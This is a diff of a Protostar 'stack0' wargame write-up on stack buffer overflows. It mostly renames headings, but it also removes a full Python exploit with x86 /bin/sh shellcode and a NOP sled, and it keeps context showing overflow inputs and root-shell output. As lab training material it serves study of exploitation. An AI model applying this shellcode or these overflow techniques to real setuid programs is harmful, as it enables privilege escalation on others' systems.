@@ -1,6 +1,6 @@
-# Stack0
+# stack0
 
-## Solution
+## solution
 Disassemble main in `radare2` so we can see the locations (relative to %esp) of the `s` and
 `var_8h` variables. 
 ```
@@ -27,9 +27,9 @@ user@protostar:/opt/protostar/bin$ python -c 'print "A"*64+"BBBB"' | ./stack0
 you have changed the 'modified' variable
 ```
 
-## Shells
+## shells
 
-### Classic
+### classic buffer overflow
 First we need to find the offset from the start of the buffer to the %eip register, so we can
 redirect process execution. We can do this by giving it a known pattern of bytes, in this case
 `BBBBCCCCDDDD`, and so on.
@@ -72,7 +72,7 @@ you have changed the 'modified' variable
 uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
 ```
 
-### Ret2libc
+### ret2libc
 First we need to find the address of `system` within memory. We can do this within gdb.
 ```
 (gdb) b main
@@ -141,42 +141,7 @@ id
 uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
 ```
 
-### Rop Chain to Shellcode
-Here we just redirect process execution to a `ret` instruction, which then takes the next 4 bytes
-on the stack and calls the shellcode there.
-
-```py
-import struct
-
-off = 80
-
-pad = 'A' * off
-
-buf = ''
-buf += '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9'
-buf += '\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89'
-buf += '\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'
-
-nop = '\x90' * 0x80
-
-ret = struct.pack('I', 0x08048434)
-ret += struct.pack('I', 0xbffff7b4 + 0x80)
-
-print pad + ret + nop + buf
-```
-
-Here it is in action.
-```
-user@protostar:/opt/protostar/bin$ python /tmp/pwn.py | ./stack0
-you have changed the 'modified' variable
-# id
-uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
-```
-
-### Rop Chain to Libc
-...
-
-### Ret2.text to Shellcode
+### ret2.text to shellcode
 First we need to find a POP, POP, RET gadget in the target binary. We can do this with
 `msfelfscan`.
 ```
@@ -217,5 +182,5 @@ you have changed the 'modified' variable
 uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
 ```
 
-### Ret2.text to Libc
+### ret2.text to libc
 ...
